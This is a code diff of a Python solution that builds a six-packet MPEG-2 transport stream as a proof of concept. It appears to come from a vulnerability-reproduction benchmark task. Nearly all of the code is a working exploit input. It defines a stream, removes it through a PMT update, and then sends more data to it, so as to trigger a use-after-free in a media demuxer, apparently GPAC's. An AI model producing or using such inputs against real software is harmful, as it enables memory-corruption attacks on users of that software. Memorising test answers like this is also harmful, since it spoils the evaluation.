@@ -2,116 +2,123 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # MPEG-2 CRC32 implementation
-        def crc32(data):
+        def mpeg_crc32(data):
             crc = 0xFFFFFFFF
-            for b in data:
-                crc ^= (b << 24)
-                for _ in range(8):
-                    if crc & 0x80000000:
-                        crc = (crc << 1) ^ 0x04C11DB7
-                    else:
-                        crc <<= 1
-                    crc &= 0xFFFFFFFF
+            for byte in data:
+                for i in range(7, -1, -1):
+                    bit = (byte >> i) & 1
+                    c31 = (crc >> 31) & 1
+                    crc = (crc << 1) & 0xFFFFFFFF
+                    if c31 ^ bit:
+                        crc = crc ^ 0x04C11DB7
             return crc
 
-        def make_ts_packet(pid, cc, payload, pusi=0):
-            # TS Header
-            # Sync byte (0x47)
-            h1 = 0x47
-            # TEI(0), PUSI, Prio(0), PID(13)
-            h2 = (pusi << 6) | ((pid >> 8) & 0x1F)
-            h3 = pid & 0xFF
-            # SC(00), AFC(01 - Payload Only), CC(4)
-            h4 = 0x10 | (cc & 0x0F)
+        def make_ts_packet(pid, payload, cc, pusi=0):
+            # TS Packet is 188 bytes
+            # Header is 4 bytes
+            header = bytearray([0x47])
+            header.append((pusi << 6) | ((pid >> 8) & 0x1F))
+            header.append(pid & 0xFF)
             
-            header = struct.pack('BBBB', h1, h2, h3, h4)
-            
-            # Pad payload to 184 bytes with 0xFF
-            if len(payload) < 184:
-                payload = payload + b'\xff' * (184 - len(payload))
-            elif len(payload) > 184:
+            # Payload capacity = 184 bytes
+            needed_pad = 184 - len(payload)
+            if needed_pad < 0:
                 payload = payload[:184]
-                
-            return header + payload
+                needed_pad = 0
+            
+            afc = 1 # Payload only default
+            adaptation = bytearray()
+            
+            if needed_pad > 0:
+                afc = 3 # Adaptation + Payload
+                # Adaptation Field
+                if needed_pad == 1:
+                     # Length = 0 (consumes 1 byte)
+                     adaptation.append(0)
+                else:
+                    # Length field takes 1 byte
+                    af_len = needed_pad - 1
+                    adaptation.append(af_len)
+                    if af_len > 0:
+                        # Flags = 0 (1 byte)
+                        adaptation.append(0)
+                        # Stuffing (af_len - 1 bytes)
+                        if af_len > 1:
+                            adaptation.extend([0xFF] * (af_len - 1))
+            
+            header.append((afc << 4) | (cc & 0x0F))
+            return header + adaptation + payload
 
+        def make_psi_section(table_id, table_ext, version, section_data):
+            # PSI Section Format
+            # Header (3 bytes): TableID, SSI/Len
+            # Extended Header (5 bytes): ID, Ver/CN, SecNum, LastSecNum
+            # Data
+            # CRC32 (4 bytes)
+            
+            # Calculate length field value (bytes following length field)
+            # ExtHeader(5) + Data + CRC(4) = 9 + len(data)
+            sec_len_val = 9 + len(section_data)
+            
+            head = bytearray()
+            head.append(table_id)
+            # SSI=1(0x80), Reserved=3(0x30), High 4 bits of len
+            head.append(0xB0 | ((sec_len_val >> 8) & 0x0F))
+            head.append(sec_len_val & 0xFF)
+            
+            head.append((table_ext >> 8) & 0xFF)
+            head.append(table_ext & 0xFF)
+            
+            # Reserved(3)=11(0xC0), Version(5), CN(1)
+            head.append(0xC0 | ((version & 0x1F) << 1) | 1)
+            
+            head.append(0) # Section Number
+            head.append(0) # Last Section Number
+            
+            partial = head + section_data
+            crc = mpeg_crc32(partial)
+            
+            return partial + struct.pack('>I', crc)
+
+        # Build the PoC (6 packets, 1128 bytes)
+        # Strategy: 
+        # 1. Define PAT pointing to PMT.
+        # 2. Define PMT pointing to an ES (Elementary Stream).
+        # 3. Send data for that ES.
+        # 4. Update PMT to remove that ES (triggering deletion).
+        # 5. Send data for that ES again (triggering UAF).
+        
         # Packet 1: PAT
-        # PID: 0, CC: 0
-        # Program 1 maps to PMT PID 0x100
-        pat_content = bytearray()
-        pat_content.append(0x00) # Table ID (PAT)
-        # Section Length: 5(Header) + 4(Loop) + 4(CRC) = 13 (0x0D)
-        # SSI=1, Reserved=11 -> 0xB
-        pat_content += struct.pack('>H', 0xB00D)
-        pat_content += struct.pack('>H', 0x0001) # Transport Stream ID
-        pat_content += bytearray([0xC1, 0x00, 0x00]) # Res=11, Ver=0, CN=1, Sec=0, Last=0
+        # Program 1 -> PID 0x100
+        pat_payload = struct.pack('>H', 1) + struct.pack('>H', 0xE000 | 0x100)
+        pat_sec = make_psi_section(0, 1, 0, pat_payload)
+        pkt1 = make_ts_packet(0, bytearray([0]) + pat_sec, cc=0, pusi=1)
         
-        # Loop: Program 1 -> PID 0x100
-        pat_content += struct.pack('>H', 0x0001) # Program Number 1
-        pat_content += struct.pack('>H', 0xE100) # Res=111, PID=0x100
-        
-        # CRC32
-        pat_content += struct.pack('>I', crc32(pat_content))
-        
-        # Add Pointer Field (0x00) because PUSI=1
-        pkt1 = make_ts_packet(0, 0, b'\x00' + pat_content, pusi=1)
-
-
         # Packet 2: PMT Version 0
-        # PID: 0x100, CC: 0
-        # Defines ES on PID 0x200
-        pmt0_content = bytearray()
-        pmt0_content.append(0x02) # Table ID (PMT)
-        # Section Length: 9(Header) + 5(Stream Loop) + 4(CRC) = 18 (0x12)
-        pmt0_content += struct.pack('>H', 0xB012)
-        pmt0_content += struct.pack('>H', 0x0001) # Program Number 1
-        pmt0_content += bytearray([0xC1, 0x00, 0x00]) # Res=11, Ver=0, CN=1, Sec=0, Last=0
-        pmt0_content += struct.pack('>H', 0xE200) # Res=111, PCR PID=0x200
-        pmt0_content += struct.pack('>H', 0xF000) # Res=1111, Prog Info Len=0
+        # Program 1. PCR PID 0x1FF.
+        # Stream 1: Type 0x1B (H.264), PID 0x200
+        pmt_v0_data = struct.pack('>H', 0xE1FF) + struct.pack('>H', 0xF000)
+        pmt_v0_data += bytearray([0x1B]) + struct.pack('>H', 0xE200) + struct.pack('>H', 0xF000)
+        pmt_sec_v0 = make_psi_section(2, 1, 0, pmt_v0_data)
+        pkt2 = make_ts_packet(0x100, bytearray([0]) + pmt_sec_v0, cc=0, pusi=1)
         
-        # Stream Loop: Type AAC (0x0F) -> PID 0x200
-        pmt0_content.append(0x0F) # Stream Type
-        pmt0_content += struct.pack('>H', 0xE200) # Res=111, Elem PID=0x200
-        pmt0_content += struct.pack('>H', 0xF000) # Res=1111, ES Info Len=0
+        # Packet 3: ES Data (PID 0x200)
+        # Valid PES packet start
+        es_payload = bytearray([0x00, 0x00, 0x01, 0xE0, 0x00, 0x00]) + b'\xAA'*100
+        pkt3 = make_ts_packet(0x200, es_payload, cc=0, pusi=1)
         
-        # CRC32
-        pmt0_content += struct.pack('>I', crc32(pmt0_content))
-        
-        pkt2 = make_ts_packet(0x100, 0, b'\x00' + pmt0_content, pusi=1)
-
-
-        # Packet 3: Data Payload for PID 0x200
-        # Initializes the stream context in the demuxer
-        pkt3 = make_ts_packet(0x200, 0, b'\xAA' * 184)
-
-
         # Packet 4: PMT Version 1 (Update)
-        # PID: 0x100, CC: 1
-        # Removes ES 0x200 (Empty Loop) to trigger gf_m2ts_es_del
-        pmt1_content = bytearray()
-        pmt1_content.append(0x02) # Table ID (PMT)
-        # Section Length: 9(Header) + 0(Stream Loop) + 4(CRC) = 13 (0x0D)
-        pmt1_content += struct.pack('>H', 0xB00D)
-        pmt1_content += struct.pack('>H', 0x0001) # Program Number 1
-        # Version incremented: Ver=1 (00001) -> 0xC3 (11 00001 1)
-        pmt1_content += bytearray([0xC3, 0x00, 0x00]) 
-        # Change PCR PID to 0x1FFF (Padding) to remove reference to 0x200
-        pmt1_content += struct.pack('>H', 0xFFFF) 
-        pmt1_content += struct.pack('>H', 0xF000) # Prog Info Len=0
-        # Empty Stream Loop
+        # Removes Stream 1 (PID 0x200) to trigger gf_m2ts_es_del
+        pmt_v1_data = struct.pack('>H', 0xE1FF) + struct.pack('>H', 0xF000)
+        # No stream definitions
+        pmt_sec_v1 = make_psi_section(2, 1, 1, pmt_v1_data)
+        pkt4 = make_ts_packet(0x100, bytearray([0]) + pmt_sec_v1, cc=1, pusi=1)
         
-        # CRC32
-        pmt1_content += struct.pack('>I', crc32(pmt1_content))
+        # Packet 5: ES Data (PID 0x200) - Trigger UAF
+        # Sending data to the just-deleted stream
+        pkt5 = make_ts_packet(0x200, b'\xBB'*100, cc=1, pusi=0)
         
-        pkt4 = make_ts_packet(0x100, 1, b'\x00' + pmt1_content, pusi=1)
-
-
-        # Packet 5: Data Payload for PID 0x200
-        # Sent after the ES has been deleted by PMT update. Triggers UAF.
-        pkt5 = make_ts_packet(0x200, 1, b'\xBB' * 184)
-
-
-        # Packet 6: More Data for PID 0x200 (Redundancy/Padding)
-        pkt6 = make_ts_packet(0x200, 2, b'\xCC' * 184)
-
-        return pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6
+        # Packet 6: ES Data (PID 0x200) - Sustain
+        pkt6 = make_ts_packet(0x200, b'\xCC'*100, cc=2, pusi=0)
+        
+        return bytes(pkt1 + pkt2 + pkt3 + pkt4 + pkt5 + pkt6)
